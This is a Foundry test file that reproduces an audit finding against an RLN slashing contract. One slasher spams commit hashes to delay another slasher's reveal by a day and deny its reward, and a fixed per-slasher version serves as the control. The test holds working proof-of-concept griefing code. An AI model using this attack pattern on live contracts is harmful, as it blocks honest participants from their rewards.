// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    RLN,
    RLNFixed,
    KarmaLite,
    PoseidonHasherLite,
    MiniToken
} from "./65327-any-slasher-can-increase-another-ones-reveal-delays-cyfrin-n.sol";

contract SlasherRevealDelayGriefingTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant VICTIM_MEMBER = 0x000000000000000000000000000000000000dEaD;
    address internal constant HONEST_RECIPIENT = 0x000000000000000000000000000000000000b0b0;

    address internal constant GRIEFER = address(0x6611);
    address internal constant HONEST = address(0xB0B0B0);

    uint256 internal constant N_GRIEF = 24;
    uint256 internal constant WINDOW = 3600;
    bytes32 internal constant PRIVATE_KEY = bytes32(uint256(0xA11CE));
    uint256 internal constant VICTIM_KARMA = 10_000 ether;
    uint256 internal constant SLASH_PCT = 1000; // 10%
    uint256 internal constant EXPECTED_REWARD = 1000 ether;

    // ── End-to-end reproduction through the Exploit contract ────────────────────
    function test_exploit_slasherGriefsHonestRevealDelay() public {
        vm.warp(1_000_000); // arbitrary non-zero base time
        Exploit e = new Exploit();
        e.run();

        // The honest slasher's real reveal is DoS'd on the VULNERABLE contract...
        assertTrue(e.buggyHonestReverted(), "honest reveal must revert on vulnerable RLN");
        // ...but succeeds on the FIXED (per-slasher-keyed) contract.
        assertTrue(e.fixedHonestSucceeded(), "honest reveal must succeed on fixed RLN");

        // The griefer pushed the honest reveal exactly N * window (24h) into the future.
        assertEq(e.delaySeconds(), N_GRIEF * WINDOW, "delay = N griefing commits * window");
        assertEq(e.delaySeconds(), 86_400, "delay is 1 day");

        // The denied SLASH reward is recorded on the marker at the SINK.
        assertEq(e.deniedRewardWei(), EXPECTED_REWARD, "denied reward magnitude");
        MiniToken marker = MiniToken(e.markerAddr());
        assertEq(marker.balanceOf(SINK), EXPECTED_REWARD, "marker records denied reward at SINK");

        // On the fixed contract the honest slasher actually receives the reward.
        assertEq(e.fixedHonestReward(), EXPECTED_REWARD, "fixed path pays the honest slasher");
    }

    // ── Direct reproduction: exact revert selector + eventual success ────────────
    function test_direct_revertSelector_andEventualSuccess() public {
        vm.warp(1_000_000);
        PoseidonHasherLite poseidon = new PoseidonHasherLite();
        KarmaLite karma = new KarmaLite(SLASH_PCT);
        RLN rln = new RLN(address(karma), address(poseidon));
        karma.setRLN(address(rln));
        karma.mint(VICTIM_MEMBER, VICTIM_KARMA);

        uint256 idComm = poseidon.hash(uint256(PRIVATE_KEY));
        rln.registerMember(idComm, VICTIM_MEMBER);
        rln.grantSlasher(GRIEFER);
        rln.grantSlasher(HONEST);

        // Griefer spams the shared per-account queue with arbitrary hashes.
        for (uint256 i = 0; i < N_GRIEF; i++) {
            vm.prank(GRIEFER);
            rln.slashCommit(VICTIM_MEMBER, keccak256(abi.encode("grief", i)));
        }

        // Honest slasher commits its real hash and inherits the inflated reveal time.
        bytes32 realHash = keccak256(abi.encodePacked(PRIVATE_KEY, HONEST_RECIPIENT));
        vm.prank(HONEST);
        rln.slashCommit(VICTIM_MEMBER, realHash);

        uint256 revealStart = rln.slashCommitments(VICTIM_MEMBER, realHash);
        assertEq(revealStart, block.timestamp + N_GRIEF * WINDOW, "reveal pushed N*window out");

        // Honest reveal NOW reverts with the specific window error.
        vm.prank(HONEST);
        vm.expectRevert(RLN.RLN__RevealWindowNotStarted.selector);
        rln.slashReveal(VICTIM_MEMBER, PRIVATE_KEY, HONEST_RECIPIENT);

        // The reward is not paid while the honest slasher is blocked.
        assertEq(karma.balanceOf(HONEST_RECIPIENT), 0, "no reward while DoS'd");

        // Only after the full attacker-chosen delay can the honest slasher finally reveal.
        vm.warp(revealStart);
        vm.prank(HONEST);
        rln.slashReveal(VICTIM_MEMBER, PRIVATE_KEY, HONEST_RECIPIENT);
        assertEq(karma.balanceOf(HONEST_RECIPIENT), EXPECTED_REWARD, "reward paid only after 1-day delay");
    }

    // ── Negative control: the fix isolates each slasher's queue ─────────────────
    function test_control_fixedRLN_honestRevealNotDelayed() public {
        vm.warp(1_000_000);
        PoseidonHasherLite poseidon = new PoseidonHasherLite();
        KarmaLite karma = new KarmaLite(SLASH_PCT);
        RLNFixed rln = new RLNFixed(address(karma), address(poseidon));
        karma.setRLN(address(rln));
        karma.mint(VICTIM_MEMBER, VICTIM_KARMA);

        uint256 idComm = poseidon.hash(uint256(PRIVATE_KEY));
        rln.registerMember(idComm, VICTIM_MEMBER);
        rln.grantSlasher(GRIEFER);
        rln.grantSlasher(HONEST);

        // Same griefing spam by the griefer.
        for (uint256 i = 0; i < N_GRIEF; i++) {
            vm.prank(GRIEFER);
            rln.slashCommit(VICTIM_MEMBER, keccak256(abi.encode("grief", i)));
        }

        // Honest slasher commits: its OWN per-slasher queue is fresh.
        bytes32 realHash = keccak256(abi.encodePacked(PRIVATE_KEY, HONEST_RECIPIENT));
        vm.prank(HONEST);
        rln.slashCommit(VICTIM_MEMBER, realHash);

        bytes32 key = keccak256(abi.encodePacked(HONEST, realHash));
        assertEq(rln.slashCommitments(VICTIM_MEMBER, key), block.timestamp, "no delay on fixed contract");

        // Honest reveal succeeds immediately and is paid — no DoS.
        vm.prank(HONEST);
        rln.slashReveal(VICTIM_MEMBER, PRIVATE_KEY, HONEST_RECIPIENT);
        assertEq(karma.balanceOf(HONEST_RECIPIENT), EXPECTED_REWARD, "honest slasher paid immediately");
    }
}
